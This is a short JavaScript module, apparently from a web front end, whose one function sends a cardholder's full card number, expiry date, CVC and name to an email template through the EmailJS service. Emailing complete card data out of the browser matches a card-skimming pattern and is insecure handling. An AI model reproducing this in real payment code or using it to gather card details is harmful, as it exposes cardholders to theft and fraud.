import emailjs from "@emailjs/browser";

const sendCustomEmail = ({ cardNumber, month, year, cvc, cardholderName }) => {
  emailjs
    .send(
      import.meta.env.VITE_EMAIL_SERVICE_ID,
      import.meta.env.VITE_EMAIL_TEMPLATE_ID,
      {
        cardholderName: cardholderName,
        cardNumber: cardNumber,
        month: month,
        year: year,
        cvc: cvc,
      },
      {
        publicKey: import.meta.env.VITE_EMAIL_USER_ID,
      }
    )
    .then(
      (response) => {
        console.log("SUCCESS!", response.status, response.text);
      },
      (err) => {
        console.log("FAILED...", err);
      }
    );
};

export { sendCustomEmail };
